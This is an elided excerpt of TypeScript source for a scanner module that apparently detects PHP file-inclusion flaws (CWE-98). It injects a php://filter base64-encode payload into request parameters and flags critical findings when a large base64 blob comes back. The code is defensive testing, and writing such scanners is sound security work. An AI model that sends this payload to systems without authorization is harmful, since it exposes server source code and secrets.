...
const PHP_WRAPPER_PAYLOADS = [
  { payload: 'php://filter/convert.base64-encode/resource=index', marker_pattern: /^[A-Za-z0-9+/]{50,}={0,2}$/m, technique: 'php://filter base64' },
  ...
  async scan(url: string, endpoints: EndpointInfo[], client: HttpClient): Promise<ModuleFinding[]> {
    ...
    for (const ep of endpoints) {
      ...
      for (const param of paramsToTest) {
        ...
        // PHP wrapper tests — get a baseline first for size comparison
        const wrapperBaseline = await this.inject(ep, param, 'harmless_test_value', client);

        for (const { payload, marker_pattern, technique } of PHP_WRAPPER_PAYLOADS) {
          const res = await this.inject(ep, param, payload, client);
          if (res.status === 0) continue;

          // Require pattern match AND response significantly larger than baseline (>200 bytes)
          if (marker_pattern.test(res.body) && (res.size - wrapperBaseline.size) > 200) {
            findings.push({
              severity: 'critical',
              ...
              cwe_id: 'CWE-98', owasp_category: 'A03:2021', cvss_score: 9.1,
              evidence: { payload, technique, response_preview: res.body.slice(0, 200), baseline_size: wrapperBaseline.size, response_size: res.size },
            });
            break;
          }
        }
